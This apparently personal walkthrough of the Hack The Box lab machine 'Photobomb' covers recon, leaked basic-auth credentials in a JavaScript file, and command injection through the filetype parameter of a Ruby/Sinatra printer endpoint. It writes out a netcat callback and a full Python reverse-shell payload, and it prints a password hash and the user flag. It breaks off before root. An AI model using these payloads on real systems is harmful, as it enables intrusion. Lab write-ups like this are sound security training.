# [27 - Photobomb](https://app.hackthebox.com/machines/Photobomb)

![Photobomb.png](Photobomb.png)

## description
> 10.10.11.182

## walkthrough

### recon

```
$ nmap -sC -sV -A -Pn -p- photobomb.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-29 08:54 MDT
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.056s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Photobomb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

ok, pretty standard.

### 80

> Welcome to your new Photobomb franshise!
> You will soon be making an amazing income selling premium photographic gifts.

> This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.

> To get started, please click here! (the credentials are in your welcome pack).

> If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.

[here](http://photobomb.htb/printer) is a link

and `photobomb.js` has the content
```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

ok, some creds - which get us to a gallery of some sort, allowing us to specify file type and size, and a link to download

which is actually a POST
```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png&dimensions=1000x1500
```

piping that through sqlmap, nothing popping.

gobuster
```
/favicon.ico          (Status: 200) [Size: 10990]
/printers             (Status: 401) [Size: 188]
/printer              (Status: 401) [Size: 188]
```

interesting, `printers` gives us

```
Sinatra doesn’t know this ditty.
Try this:

get '/printers' do
  "Hello World"
end
```

ohai ruby

```
Bad Request
bad URI `/]'.
WEBrick/1.6.0 (Ruby/2.7.0/2019-12-25) at photobomb:4567
```

wait webrick and sinatra?

POSTing `photo=../../../../../etc/passwd` gives `Invalid photo`

trying SSTI in file and dimensions lead to "Invalid <type>"

`http://photobomb.htb/ui_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg` gives the thumbnail image

wrote [foo.rb](foo.rb) to pull all the thumbnails while waiting for gobuster to finish scanning that dir for anything else

```
$ find . -iname '*.jpg' -exec stegseek {} \;
...
```
nothing useful. same with strings


trying more injection in parameters we do control

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;nc%2010.10.14.5 4444&dimensions=30x20
```

led to

```
$ nc -lv 4444
Listening on 0.0.0.0 4444
Connection received on photobomb.htb 41866
```

boom baby.

took a couple tries, but with
```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;python3%20-c%20'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'&dimensions=30x20
```

got to
```
$ nc -lv 4444
Listening on 0.0.0.0 4444
Connection received on photobomb.htb 51706
/bin/sh: 0: can't access tty; job control turned off
$ id -a
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
$
```

### wizard

```
$ pwd
/home/wizard/photobomb
$ ls -la
total 40
drwxrwxr-x 6 wizard wizard 4096 Nov 12 21:42 .
drwxr-xr-x 7 wizard wizard 4096 Sep 16 15:14 ..
-rw-rw-r-- 1 wizard wizard   44 Sep 14 09:29 .htpasswd
drwxrwxr-x 2 wizard wizard 4096 Sep 16 15:14 log
-rwxrwxr-x 1 wizard wizard   85 Sep 14 09:29 photobomb.sh
drwxrwxr-x 3 wizard wizard 4096 Sep 16 15:14 public
drwxrwxr-x 2 wizard wizard 4096 Nov 12 21:45 resized_images
-rw-rw-r-- 1 wizard wizard 4428 Sep 14 12:40 server.rb
drwxrwxr-x 2 wizard wizard 4096 Sep 16 15:14 source_images
$ cat .htpasswd
pH0t0:$apr1$dnyF00ZD$9PifZwUxL/J0BCS/wTShU1

```

looking at `server.rb`:
```ruby
post '/printer' do
  photo = params[:photo]
  filetype = params[:filetype]
  dimensions = params[:dimensions]

  # handle inputs
  if photo.match(/\.{2}|\//)
    halt 500, 'Invalid photo.'
  end

  if !FileTest.exist?( "source_images/" + photo )
    halt 500, 'Source photo does not exist.'
  end

  if !filetype.match(/^(png|jpg)/)
    halt 500, 'Invalid filetype.'
  end

  if !dimensions.match(/^[0-9]+x[0-9]+$/)
    halt 500, 'Invalid dimensions.'
  end

  case filetype
  when 'png'
    content_type 'image/png'
  when 'jpg'
    content_type 'image/jpeg'
  end

  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
  else
    puts "File already exists."
  end

  if File.exists?('resized_images/' + filename)
    halt 200, {}, IO.read('resized_images/' + filename)
  end

  #message = 'Failed to generate a copy of ' + photo + ' resized to ' + dimensions + ' with filetype ' + filetype
  message = 'Failed to generate a copy of ' + photo
  halt 500, message
end
```

```
$ ls -la ../
total 44
drwxr-xr-x 7 wizard wizard 4096 Sep 16 15:14 .
drwxr-xr-x 3 root   root   4096 Sep 16 15:14 ..
lrwxrwxrwx 1 wizard wizard    9 Mar 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 wizard wizard  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 wizard wizard 3771 Feb 25  2020 .bashrc
drwx------ 2 wizard wizard 4096 Sep 16 15:14 .cache
drwxrwxr-x 4 wizard wizard 4096 Sep 16 15:14 .gem
drwx------ 3 wizard wizard 4096 Sep 16 15:14 .gnupg
drwxrwxr-x 3 wizard wizard 4096 Sep 16 15:14 .local
drwxrwxr-x 6 wizard wizard 4096 Nov 12 21:42 photobomb
-rw-r--r-- 1 wizard wizard  807 Feb 25  2020 .profile
-rw-r----- 1 root   wizard   33 Nov 12 20:52 user.txt
$ cat ../user.txt
204b628c44f7f32c5920cc4bdc369d62

```

### pivot


## flag
```
user:204b628c44f7f32c5920cc4bdc369d62
root:
```
